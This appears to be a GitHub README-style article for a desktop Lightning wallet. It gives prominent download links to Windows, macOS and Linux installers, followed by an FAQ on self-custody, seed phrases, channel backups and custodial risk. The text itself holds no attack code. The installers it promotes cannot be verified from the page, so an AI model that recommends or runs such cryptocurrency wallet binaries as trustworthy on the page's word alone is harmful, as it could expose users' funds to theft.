<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Self-custody in Lightning Pay Wallet: what you hold and what you do not
Your keys are created on your machine and stay there; the channels, the backup and the card are separate questions.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**
Self-custody in Lightning Pay Wallet means the keys that control your bitcoin are generated on your device and stored on it, not on a server belonging to us. Nothing in the wallet can be frozen, seized or reset by the company, because the company never holds the keys. What you do hold, and what you still depend on, is the subject of this page.

## What a non-custodial wallet is

A non-custodial wallet is software that creates and stores your private keys on your own device, so the balance is controlled by you rather than by an account at a company. A custodial wallet, by contrast, keeps the keys on its own servers and shows you a balance it owes you.

In a custodial wallet the company can freeze an account, demand identity documents, or lose the funds in a failure that has nothing to do with you. A non-custodial wallet trades those failures for two others: you must keep the backup, and nobody can help if you lose it.

## Is Lightning Pay Wallet non-custodial?

Yes. The wallet creates its keys on your device, stores them locally, and has no account system, so there is no server-side wallet for us to hold. The wallet works with no email address, no password reset and no identity check, which is only possible because the keys never leave the machine.

One thing that follows from the architecture is worth stating without decoration: there is no recovery desk. If the phrase is lost and the device is lost, the funds are gone, and no support conversation changes that. A wallet that could restore your balance without your phrase would be a custodial wallet by definition.

## Can Lightning Pay see my balance or freeze the wallet?

No. The wallet holds your keys and talks to the Lightning Network directly, so there is no balance on our side to read and no switch on our side to flip. We cannot freeze a wallet we cannot see, and we cannot block a payment we never route.

The company does see what any service provider sees: card transactions pass through the card issuer, which keeps its own records and has its own obligations. A card issuer can decline a card payment even though nobody can freeze your wallet.

## What you hold, and what you still depend on

You hold the keys, the phrase that backs them up, and the balance in your channels. You depend on three things you do not control: the Lightning Network's routing, the Bitcoin chain's confirmation times, and the businesses behind the card and transfer features.

Lightning adds a dependency on-chain wallets do not have. Your balance sits in channels shared with a counterparty, and a channel that closes while the wallet is offline is recovered through a channel backup, not the seed phrase alone. The phrase restores the keys; the channel backup restores funds in flight, and [seed phrase and wallet recovery](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-seed-phrase-and-wallet-recovery.md) covers both.

## What happens if the company shuts down

If the company disappeared tomorrow, the wallet on your machine would keep working: it would still hold your keys, still connect to the network, and still send payments. That is what self-custody buys you, and it is the reason the answer to this question is not "your funds are lost".

What would stop is everything around the wallet: updates, support, the card and the services behind them. The software would not vanish, but a wallet that stops receiving updates eventually stops working with the network it talks to. Keeping [the current release](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) installed is the practical hedge.

## Non-custodial versus custodial: which is safer

Neither is safer in the abstract; they fail differently. A custodial wallet is safer against your own mistakes and less safe against the company's, while a non-custodial wallet is the reverse. The question to ask is which failure you can actually prevent.

If you will not reliably keep a written phrase, a custodial service protects you from the mistake you are most likely to make. If you want the balance to exist independently of any company's decisions, self-custody is the only version of that. Where large amounts are involved, most people end up with both: a small custodial balance for convenience and a self-custodial wallet for the rest.

## What can go wrong with a non-custodial wallet

Three failures account for most losses: a lost or photographed phrase, a build installed from somewhere other than the official download page, and a channel closed while the wallet had no backup. Each is a mistake you can make alone.

A fourth is specific to Lightning. Funds in a channel are commitments between two nodes; a forced closure settles them back on-chain after a delay, and the settlement costs an on-chain fee. A channel balance is money in a payment system, not money in a vault.

## How to secure your private keys

Write the phrase on paper at the moment the wallet shows it, in order, and store it offline in a place you would trust with a passport. Do not photograph it, do not type it into a password manager, and do not keep a copy in cloud storage. The phrase is the wallet; every copy is another way to lose it.

Three habits carry the rest: install only the current release from the official download page, keep the disk encrypted and the system updated, and treat any message asking for the phrase as an attack.

## Hardware wallets

A hardware wallet keeps keys in a device that never exposes them to the computer and signs on the device itself, removing the attack where malware on a desktop reads a key file.

Lightning Pay Wallet is a desktop application and does not sign through an external hardware wallet. If hardware-held keys are a requirement, keep the long-term balance in the hardware wallet and use the Lightning wallet for spending money. The two do not need to be the same wallet.

## Is a second layer still decentralised?

Lightning payments settle through channels between nodes rather than directly on the chain, so they are a second layer over Bitcoin rather than a replacement for it. Your keys still control the funds, and a channel can always be closed to return the balance on-chain.

What changes is who you depend on in the moment: the counterparty in your channel and the nodes that route a payment. That is a real reduction in independence, and it is why Lightning is a spending layer rather than a savings layer. It is still not custody by a company.

## Is it practical to keep bitcoin in Lightning and spend it daily?

Yes, if the amount is spending money and not savings. Lightning settles in seconds for a fraction of a satoshi, which is what makes daily use possible at all; an on-chain payment cannot compete on speed or cost for a coffee.

The arrangement that works is a small balance in the Lightning wallet, topped up from on-chain when it runs low, with the bulk of the holding out of channel risk. That is not a compromise on self-custody; it is what self-custody looks like when one wallet is built for payments and another for storage.

## Which non-custodial wallet is safest?

The safest non-custodial wallet is the one whose backup you understand, whose software you can inspect, and whose build you install from a source you can verify. Those three properties matter more than any feature list, and they are the criteria to apply to every candidate rather than a ranking to copy.

Applying them narrows the field quickly. A wallet that hides its source, or keeps the phrase where you cannot write it down, fails on inspection. A wallet that asks for the phrase to verify it is a phishing attempt wearing a wallet's name.

The same thinking answers the shortcut questions. A mobile app holding many tokens carries a different risk from a Bitcoin-only wallet, because more code touches the keys. A desktop wallet with a local key file sits between a custodial app and a hardware device.

The wallet itself is described in [what Lightning Pay Wallet is and whether it is safe](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-what-it-is-and-is-it-safe.md), and what a payment costs in [what a Lightning payment costs](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-fees-cost-of-a-lightning-payment.md).

## Questions people ask

### Do I own my bitcoin if it is in a Lightning channel?

Yes. The keys that control the channel are yours, and you can close the channel to settle the balance back on-chain. The counterparty shares the channel but cannot take your side of it without your keys.

### Can a channel be closed without my permission?

Yes, and it is a normal part of the protocol rather than an attack. If your node goes offline for long enough, the counterparty can force a closure; your funds settle back on-chain after a delay, provided you have the channel backup to claim them.

### Is a non-custodial wallet legal to use?

Holding your own keys is legal in most jurisdictions, and the wallet itself performs no identity check. Tax and reporting rules still apply to what you do with the bitcoin, and they are your responsibility rather than the wallet's.

### If I lose my phone or laptop, do I lose the bitcoin?

Not if you have the phrase and, for Lightning balances, the channel backup. The phrase restores the keys on a new machine; without it there is no recovery path, because no copy exists anywhere else.
